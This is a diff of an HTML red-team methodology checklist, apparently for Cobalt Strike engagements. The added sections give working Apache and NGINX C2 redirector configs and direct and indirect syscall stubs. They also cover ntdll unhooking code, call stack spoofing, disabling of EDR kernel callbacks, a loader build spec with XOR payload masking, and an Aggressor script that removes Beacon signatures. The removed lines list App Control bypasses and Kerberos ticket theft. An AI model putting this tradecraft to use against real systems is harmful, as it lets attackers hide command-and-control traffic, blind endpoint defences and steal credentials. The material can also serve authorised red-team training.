-  <li><input type="checkbox" data-id="crtl-app-rule-options"> Review enabled rule options for <code>UMCI</code>, <code>Runtime FilePath Rule Protection</code>, and <code>Dynamic Code Security</code></li>
-  <li><input type="checkbox" data-id="crtl-app-attrib"> Repackage Cobalt Strike artifacts with file attributes matching any <code>FileAttrib</code>-based allow rule (<code>OriginalFilename</code> / <code>ProductName</code>)</li>
-  <li><input type="checkbox" data-id="crtl-app-wildcard"> Hunt path-wildcard allow rules and check the directory's writability check &mdash; admin-equivalent SIDs only</li>
-  <li><input type="checkbox" data-id="crtl-app-lotl"> Execute via LOLBAS that bypass App Control where <code>Dynamic Code Security</code> is off (<code>Microsoft.Workflow.Compiler</code>, MSBuild)</li>
-  <li><input type="checkbox" data-id="crtl-app-electron"> Hijack a signed Electron app's JavaScript files (Teams, VS Code) where ASAR integrity isn't enforced</li>
-  <li><input type="checkbox" data-id="crtl-app-signing"> Sign payloads with an in-scope code-signing certificate (recovered cert + <code>signtool</code>, or fresh enroll on a writable template + Cobalt Strike <code>code-signer</code>)</li>
-  <li><input type="checkbox" data-id="crtl-app-supplemental"> Deploy a custom supplemental policy with allow rules for operator tools when local admin is available</li>
-  <li><input type="checkbox" data-id="crtl-app-deny"> Deploy a custom deny-only base policy from the <code>AllowAll</code> template to selectively kill defender processes</li>
-</ul>
+<h3 id="methodology-c2-infra">11.1 C2 Infrastructure</h3>
+<p>Build layered redirector infrastructure before any payload touches a target. Separate initial-access, persistence, and post-exploitation traffic across dedicated team servers.</p>
+<h4 id="methodology-c2-infra-redirector-setup">11.1.1 Redirector Setup</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-0"> Configure Apache as a smart redirector:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-0-0"> Enable modules: <code>sudo a2enmod rewrite proxy proxy_http</code></li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-0-1"> Create <code>.htaccess</code> with <code>RewriteEngine On</code></li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-0-2"> Match URI with <code>RewriteCond %{{REQUEST_URI}} ^/api/v1/update$</code></li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-0-3"> Match query string with <code>RewriteCond %{{QUERY_STRING}} ^session=[a-f0-9]{{32}}$</code></li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-0-4"> Proxy to team server: <code>RewriteRule ^(.*)$ https://teamserver:443%{{REQUEST_URI}} [P,L]</code></li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-0-5"> Default rule: redirect all non-matching traffic to a legitimate site</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Apache .htaccess — smart redirector
+RewriteEngine On
+RewriteCond %{REQUEST_URI} ^/api/v1/update$
+RewriteCond %{QUERY_STRING} ^session=[a-f0-9]{32}$
+RewriteRule ^(.*)$ https://teamserver:443%{REQUEST_URI} [P,L]
+# Default: send everything else to a legitimate site
+RewriteRule ^(.*)$ https://www.legitimate-site.com/ [L,R=302]</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-1"> Configure NGINX as an alternative redirector:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-1-0"> Install: <code>sudo apt install nginx</code></li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-1-1"> Use <code>location ~*</code> regex blocks for URI matching</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-1-2"> Conditional forwarding with <code>$request_method</code> and <code>$query_string</code> variables</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-1-3"> Proxy pass to team server: <code>proxy_pass https://teamserver:443</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># NGINX — conditional forwarding
+location ~* ^/api/v1/update$ {
+    if ($query_string ~* "^session=[a-f0-9]{32}$") {
+        proxy_pass https://teamserver:443;
+        break;
+    }
+    return 302 https://www.legitimate-site.com/;
+}</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-2"> Filter payloads by source IP:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-2-0"> Apache: <code>RewriteCond %{{REMOTE_ADDR}} !^10\.10\.10\.</code> to restrict</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-2-1"> NGINX: check <code>$remote_addr</code> in an <code>if</code> block</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-2-2"> Block known sandbox and AV vendor IP ranges</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-2-3"> Log all blocked requests for operational awareness</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-3"> Validate the redirector end-to-end before delivery:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-3-0"> Send a test beacon through the full chain</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-3-1"> Confirm non-matching requests land on the decoy site</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-redirector-setup-wf-3-2"> Confirm blocked IPs get the decoy, not the C2 response</li>
+      </ul>
+    </li>
+  </ul>
 
-<h3 id="methodology-credguard">10.8 Credential Guard &amp; Credential Theft</h3>
-<ul>
-  <li><input type="checkbox" data-id="crtl-cg-state"> Confirm Credential Guard status &mdash; LSAIso process present, <code>HKLM\System\CurrentControlSet\Control\Lsa\LsaCfgFlags</code> value</li>
-  <li><input type="checkbox" data-id="crtl-cg-service-tix"> Extract usable service tickets via <code>rubeus triage</code> / <code>dump /service:</code> &mdash; service tickets are not protected</li>
-  <li><input type="checkbox" data-id="crtl-cg-asktgs"> Use <code>rubeus asktgs /luid:</code> to mint new service tickets from a session's encrypted TGT via the LSA</li>
-  <li><input type="checkbox" data-id="crtl-cg-plaintext"> Use <code>rubeus asktgt /password:</code> for any user whose plaintext (or AES key) is recovered &mdash; bypasses Credential Guard entirely</li>
-  <li><input type="checkbox" data-id="crtl-cg-pkinit"> Extract user/computer certificates via <code>SharpDPAPI certificates /unprotect</code> and use them with <code>rubeus asktgt /certificate:</code> for PKINIT TGTs</li>
-  <li><input type="checkbox" data-id="crtl-cg-keylog"> Fall back to keylogging, DCC2 cracking, or third-party credential stores when Kerberos paths are dead</li>
-  <li><input type="checkbox" data-id="crtl-cg-clientauth"> Hunt certificate stores on every reachable host for client-auth certificates with cached keys</li>
-</ul>
+<h4 id="methodology-c2-infra-multi-server">11.1.2 Multi-Server Strategy</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-0"> Separate team servers by engagement phase:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-0-0"> Initial access server: high-interaction, expendable if burned</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-0-1"> Persistence server: low-and-slow, minimal traffic, long sleep</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-0-2"> Post-exploitation server: high-volume, lateral movement traffic</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-1"> Use a distinct Malleable C2 profile per server:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-1-0"> Different URIs, headers, and user-agent strings per profile</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-1-1"> Set <code>http-config { set trust_x_forwarded_for "true"; }</code> for real client IPs behind redirectors</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-1-2"> Match the profile to the expected traffic pattern (CDN, SaaS, update check)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-2"> Plan for infrastructure burn:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-2-0"> Pre-stage replacement redirectors with different domains</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-2-1"> Use automation (Terraform / Ansible) to rebuild within minutes</li>
+        <li><input type="checkbox" data-id="methodology-c2-infra-multi-server-wf-2-2"> Rotate domains and IPs on a schedule, not just when burned</li>
+      </ul>
+    </li>
+  </ul>
 
-<h2 id="references">11. References</h2>
+<p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+
+<h3 id="methodology-edr-telemetry">11.2 EDR Telemetry Understanding</h3>
+<p>Understand what the EDR sees before attempting to evade it. Map the telemetry sources, identify the hooks, and choose the right evasion primitive for each sensor.</p>
+<h4 id="methodology-edr-telemetry-syscall-evasion">11.2.1 Syscall Evasion</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-0"> Understand the hooking model:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-0-0"> EDRs hook ntdll.dll exports with a JMP to their inspection DLL</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-0-1"> Hooked call flow: your code &rarr; ntdll stub &rarr; JMP to EDR &rarr; EDR inspects &rarr; original syscall</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-0-2"> Goal: bypass the JMP and reach the kernel syscall directly</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-1"> Implement direct syscalls:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-1-0"> MASM stub pattern: <code>mov r10, rcx; mov eax, SSN; syscall; ret</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-1-1"> Compile the stub into your loader, call it instead of the ntdll export</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-1-2"> Downside: the call stack shows your module, not ntdll &mdash; detectable by stack-walking EDRs</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-nasm">; Direct syscall stub (MASM x64)
+NtAllocateVirtualMemory PROC
+    mov r10, rcx            ; syscall convention: r10 = first arg
+    mov eax, 18h            ; SSN for NtAllocateVirtualMemory (version-dependent)
+    syscall
+    ret
+NtAllocateVirtualMemory ENDP</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-2"> Implement indirect syscalls for clean call stacks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-2-0"> Resolve the <code>syscall</code> instruction address inside ntdll at runtime</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-2-1"> Jump to it: <code>jmp QWORD PTR [ntOpenProcessSyscall]</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-2-2"> The return address on the stack now points into ntdll &mdash; clean call stack</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-syscall-evasion-wf-2-3"> Combine with SSN resolution (below) for a complete bypass</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-nasm">; Indirect syscall stub — jumps to syscall instruction inside ntdll
+NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, 18h                            ; SSN
+    jmp QWORD PTR [ntAllocSyscallAddr]      ; jump to ntdll's syscall;ret gadget
+NtAllocateVirtualMemory ENDP</code></pre>
+
+<h4 id="methodology-edr-telemetry-ssn-resolution">11.2.2 SSN Resolution</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-0"> Hell&rsquo;s Gate: resolve SSNs from the EAT:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-0-0"> Walk ntdll&rsquo;s Export Address Table to find each <code>Nt*</code> function</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-0-1"> Scan the function prologue for <code>0xB8</code> (mov eax, imm32) to extract the SSN</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-0-2"> Fails if the prologue is hooked (JMP overwrites the mov)</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-1"> Halo&rsquo;s Gate: infer SSNs from neighbours:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-1-0"> When the target function is hooked, read the SSN from an adjacent unhooked neighbour</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-1-1"> SSNs are sequential &mdash; add or subtract the offset to compute the target SSN</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-1-2"> Iterate up and down until an unhooked neighbour is found</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-2"> Tartarus&rsquo; Gate: handle multi-byte hooks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-2-0"> Also check for <code>0xE9</code> (near JMP) in addition to the standard hook check</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-2-1"> Detects EDRs that use longer trampolines instead of short JMPs</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-ssn-resolution-wf-2-2"> Combines Halo&rsquo;s Gate fallback for full coverage</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+
+<h4 id="methodology-edr-telemetry-api-unhooking">11.2.3 API Unhooking</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-0"> Load a clean copy of ntdll from disk:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-0-0"> Open <code>C:\\Windows\\System32\\ntdll.dll</code> with <code>CreateFile</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-0-1"> Map it into memory with <code>CreateFileMapping</code> + <code>MapViewOfFile</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-0-2"> This gives you a pristine, unhooked copy of ntdll</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-1"> Overwrite the hooked .text section:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-1-0"> Find the <code>.text</code> section in both the loaded and clean copies</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-1-1"> Change permissions: <code>VirtualProtect(PAGE_EXECUTE_READWRITE)</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-1-2"> Copy clean bytes: <code>memcpy(loaded_text, clean_text, text_size)</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-1-3"> Restore permissions: <code>VirtualProtect(PAGE_EXECUTE_READ)</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-1-4"> Flush: <code>FlushInstructionCache(GetCurrentProcess(), NULL, 0)</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-csharp">// API unhooking — overwrite hooked ntdll .text with clean copy
+HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+HANDLE hMap  = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+
+// Find .text section in both copies, overwrite hooked with clean
+DWORD oldProtect;
+VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
+memcpy(hooked_text, clean_text, text_size);
+VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READ, &amp;oldProtect);
+FlushInstructionCache(GetCurrentProcess(), NULL, 0);</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-2"> Validate the unhook:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-2-0"> Call a hooked function and confirm it reaches the kernel without EDR interception</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-2-1"> Check for re-hooking &mdash; some EDRs periodically reinstall hooks</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-api-unhooking-wf-2-2"> Consider unhooking on-demand per function rather than the entire DLL</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://www.mdsec.co.uk/" target="_blank" rel="noopener noreferrer">MDSec research</a></p>
+
+<h4 id="methodology-edr-telemetry-callstack-spoofing">11.2.4 Call Stack Spoofing</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-0"> Understand why call stacks matter:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-0-0"> EDRs walk the call stack on sensitive API calls</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-0-1"> A legitimate call stack shows frames from ntdll &rarr; kernel32 &rarr; user code</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-0-2"> A suspicious stack shows your unknown module calling NtAllocateVirtualMemory directly</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-1"> Build synthetic call stack frames:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-1-0"> Push a fake return address pointing to <code>RtlUserThreadStart+0x2c</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-1-1"> Push a fake frame for <code>BaseThreadInitThunk+0x17</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-1-2"> These mimic the standard thread initialization call chain</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-2"> Use a JOP gadget for the actual call:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-2-0"> Find a <code>jmp [rbx]</code> gadget in a legitimate module</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-2-1"> Set RBX to your real target function address</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-callstack-spoofing-wf-2-2"> The gadget performs the call while the return chain looks clean</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-edr-telemetry-kernel-callbacks">11.2.5 Kernel Callback Manipulation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-0"> Understand the kernel callback types:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-0-0"> Process callbacks: <code>PsSetCreateProcessNotifyRoutineEx</code> &mdash; EDR gets notified of every process creation</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-0-1"> Handle callbacks: <code>ObRegisterCallbacks</code> &mdash; EDR can block handle operations (e.g., opening LSASS)</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-0-2"> Registry callbacks: <code>CmRegisterCallbackEx</code> &mdash; EDR monitors registry writes</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-0-3"> Image load callbacks: notified when DLLs/drivers are loaded</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-1"> Map which callbacks belong to the target EDR:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-1-0"> Use a kernel driver or tool to enumerate the callback arrays</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-1-1"> Identify entries pointing into the EDR&rsquo;s driver module</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-2"> Disable specific callbacks:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-2-0"> Process/thread/image callbacks: zero out the function pointer in the array</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-2-1"> Object callbacks: set the <code>Active</code> field to <code>0</code></li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-2-2"> Registry callbacks: unlink from the doubly-linked list</li>
+        <li><input type="checkbox" data-id="methodology-edr-telemetry-kernel-callbacks-wf-2-3"> Validate by performing the previously-monitored action and confirming no alert</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://www.mdsec.co.uk/" target="_blank" rel="noopener noreferrer">MDSec research</a> &middot; <a href="https://rastamouse.me/" target="_blank" rel="noopener noreferrer">RastaMouse</a></p>
+
+<h5>EDR Telemetry Sources &mdash; Quick Reference</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Telemetry Source</th>
+      <th>What It Sees</th>
+      <th>Evasion Technique</th>
+      <th>Tool / Method</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>User-mode hooks (ntdll)</td>
+      <td>API calls: NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx</td>
+      <td>Direct / indirect syscalls</td>
+      <td>Hell&rsquo;s Gate, RecycledGate, SysWhispers</td>
+    </tr>
+    <tr>
+      <td>ETW-TI (kernel provider)</td>
+      <td>Process injection, credential access, image loads</td>
+      <td>Patch ProviderEnableInfo.IsEnabled via kernel driver</td>
+      <td>Vulnerable driver + etw_disable</td>
+    </tr>
+    <tr>
+      <td>Kernel callbacks (PsSetCreate*)</td>
+      <td>Process/thread creation, handle operations, registry writes</td>
+      <td>Zero callback entries or unlink from list</td>
+      <td>Vulnerable driver + list_callbacks / remove_callback</td>
+    </tr>
+    <tr>
+      <td>Call stack walking</td>
+      <td>Return addresses on the stack &mdash; identifies calling module</td>
+      <td>Synthetic stack frames + JOP gadget</td>
+      <td>Draugr technique, spoof_call()</td>
+    </tr>
+    <tr>
+      <td>Memory scanning</td>
+      <td>RWX pages, PE headers, known byte signatures in memory</td>
+      <td>Sleep mask encryption, RWX removal, header garbling</td>
+      <td>PICO Sleep hook, section permission mapping</td>
+    </tr>
+    <tr>
+      <td>Thread start address</td>
+      <td>Where a new thread begins execution &mdash; flags unbacked memory</td>
+      <td>Set thread context to legitimate module offset</td>
+      <td>ObfSetThreadContext</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>General references:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a> &middot; <a href="https://www.mdsec.co.uk/" target="_blank" rel="noopener noreferrer">MDSec research</a></p>
+
+<h3 id="methodology-load-time">11.3 Load-Time Evasion</h3>
+<p>Build a loader that survives static analysis, signature scanning, and load-time inspection. Every byte on disk must be clean before execution begins.</p>
+<h4 id="methodology-load-time-crystal-palace">11.3.1 Crystal Palace PIC Framework</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-0"> Understand the Crystal Palace architecture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-0-0"> Entry point is <code>go()</code> &mdash; position-independent, no PE headers on disk</li>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-0-1"> API resolution via <code>resolve()</code> and <code>resolve_ext()</code> using ROR13 hashes</li>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-0-2"> Function references use the <code>MODULE$Function</code> DFR (Deferred Function Resolution) pattern</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-1"> Write the spec file:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-1-0"> <code>make pic +gofirst +optimize +disco +mutate</code> &mdash; build as PIC with optimizations and mutation</li>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-1-1"> <code>dfr "resolve" "ror13"</code> &mdash; configure deferred resolution with ROR13 hashing</li>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-1-2"> <code>merge</code> and <code>mergelib</code> to combine object files</li>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-1-3"> <code>run</code> to produce final output</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-2"> Hook APIs through the spec file:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-2-0"> <code>attach "KERNEL32$VirtualAlloc" "_VirtualAlloc"</code> &mdash; intercept VirtualAlloc calls</li>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-2-1"> Implement the hook function to add call stack spoofing before forwarding</li>
+        <li><input type="checkbox" data-id="methodology-load-time-crystal-palace-wf-2-2"> Use <code>spoof_call(FUNCTION_CALL*)</code> pattern for each hooked API</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Crystal Palace spec file
+make pic +gofirst +optimize +disco +mutate
+dfr "resolve" "ror13"
+merge "loader.o"
+mergelib "crystal.lib"
+attach "KERNEL32$VirtualAlloc" "_VirtualAlloc"
+attach "KERNEL32$VirtualProtect" "_VirtualProtect"
+run</code></pre>
+
+<h4 id="methodology-load-time-resource-masking">11.3.2 Resource Masking</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-0"> Encrypt the embedded resource (Beacon DLL):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-0-0"> Generate an XOR key: <code>generate $KEY 128</code> in the spec</li>
+        <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-0-1"> Apply encryption: <code>xor $KEY</code></li>
+        <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-0-2"> Prepend length: <code>preplen</code></li>
+        <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-0-3"> Link as resource: <code>link "dll"</code></li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Resource masking spec commands
+generate $KEY 128       # generate 128-byte XOR key
+xor $KEY                # encrypt the resource with the key
+preplen                 # prepend the plaintext length
+link "dll"              # link as embedded resource</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-1"> Verify the encrypted resource is signature-free:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-1-0"> Scan the output with YARA rules targeting known Beacon strings</li>
+        <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-1-1"> Scan with the target AV/EDR in an isolated VM</li>
+        <li><input type="checkbox" data-id="methodology-load-time-resource-masking-wf-1-2"> The decrypted payload should only exist in memory, never on disk</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-load-time-sig-removal">11.3.3 Static Signature Removal</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-0"> Identify signatured strings in the Beacon DLL:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-0-0"> <code>beacon.x64.dll</code> &mdash; the default DLL name</li>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-0-1"> <code>%02d/%02d/%02d</code> &mdash; date format string</li>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-0-2"> <code>ReflectiveLoader</code> &mdash; the reflective loader export name</li>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-0-3"> YARA byte patterns from public rulesets</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-1"> Replace strings with Aggressor:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-1-0"> Use <code>strrep_pad()</code> to replace each string with a random equivalent</li>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-1-1"> Pad replacement must be the same length to avoid breaking offsets</li>
+        <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-1-2"> Apply to every post-ex DLL, not just the main Beacon</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Aggressor — strrep_pad() for signature removal
+set BEACON_RDLL_GENERATE {
+    local('$dll');
+    $dll = $2;
+    $dll = strrep_pad($dll, "beacon.x64.dll",   "survey.x64.dll");
+    $dll = strrep_pad($dll, "ReflectiveLoader",  "UpdateCheckProc");
+    $dll = strrep_pad($dll, "%02d/%02d/%02d",    "%d-%d-%d______");
+    return $dll;
+}</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-load-time-sig-removal-wf-2"> Validate against public detection rules:
+      <ul>
